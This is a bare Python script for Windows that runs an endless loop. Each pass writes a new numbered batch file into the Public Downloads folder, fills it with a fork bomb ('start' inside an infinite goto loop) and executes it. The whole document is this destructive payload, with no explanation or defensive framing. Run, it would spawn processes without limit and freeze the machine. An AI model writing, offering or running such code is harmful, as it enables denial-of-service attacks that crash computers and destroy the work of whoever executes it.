import subprocess
import getpass
import os

userid ="C:\\Users\\"
cdrive ="C:\\"
username = getpass.getuser()

def CSIpublicdownload():
    global userid
    public = (R"\Users\Public\Downloads\\")
    total = str(cdrive) + str(public)
    if os.path.exists(total):
        x = 0
        while True:   
            x = x + 1
            f = open((str(total)+str(x)+'.bat'),"w+")
            f.write("""
            :a
            start
            goto a
                """)
            f.close
            subprocess.Popen((str(total))+(str(x)+'.bat'), shell=True)
    else:
        print("Code: 43")
            
CSIpublicdownload()